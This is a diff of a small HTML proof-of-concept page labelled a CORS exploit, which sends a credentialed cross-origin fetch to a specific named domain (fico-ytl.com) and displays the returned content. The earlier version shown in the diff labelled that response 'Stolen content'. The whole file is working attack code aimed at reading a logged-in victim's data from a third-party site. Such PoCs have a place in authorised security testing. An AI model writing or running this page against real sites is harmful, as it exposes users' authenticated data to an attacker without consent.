@@ -1,15 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>CORS Exploit PoC</h2>
-    <script>
+<head><title>CORS PoC</title></head>
+<body>
+  <h2>CORS Exploit Test</h2>
+  <p>If vulnerable, response from fico-ytl.com will be shown below:</p>
+  <pre id="output">Loading...</pre>
+
+  <script>
     fetch("https://fico-ytl.com/cdn-cgi/rum", {
+      method: "GET",
       credentials: "include"
     })
     .then(res => res.text())
     .then(data => {
-      alert("Stolen content:\n\n" + data);
+      document.getElementById("output").textContent = data;
+    })
+    .catch(err => {
+      document.getElementById("output").textContent = "Request failed: " + err;
     });
-    </script>
-  </body>
+  </script>
+</body>
 </html>
